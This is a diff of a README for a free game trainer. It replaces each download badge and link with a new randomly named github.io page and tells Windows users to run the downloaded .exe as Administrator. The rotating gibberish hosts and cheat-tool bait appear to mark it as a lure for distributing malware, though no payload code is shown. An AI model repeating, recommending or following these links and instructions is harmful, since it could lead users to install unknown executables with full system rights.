@@ -2,9 +2,9 @@
 
 Endacopia trainer: god mode, infinite stamina — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://wccorxpwogeu.github.io/setup-win2/)
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://wccorxpwogeu.github.io/setup-win2/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wccorxpwogeu.github.io/setup-win2/)
+[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://iuoneuelxrhu.github.io/dl-windows2/)
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://iuoneuelxrhu.github.io/dl-windows2/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iuoneuelxrhu.github.io/dl-windows2/)
 
 ---
 
@@ -31,7 +31,7 @@ Endacopia stays in the top trainer searches — god mode, infinite stamina domin
 
 ### 🪟 Windows
 
-1. Download the latest build 👉 [Download Trainer](https://wccorxpwogeu.github.io/setup-win2/)
+1. Download the latest build 👉 [Download Trainer](https://iuoneuelxrhu.github.io/dl-windows2/)
 2. Extract and run the `.exe` as Administrator.
 3. Launch Endacopia and load your save.
 4. Press **F1** to open the menu — toggle what you need. Done ✅
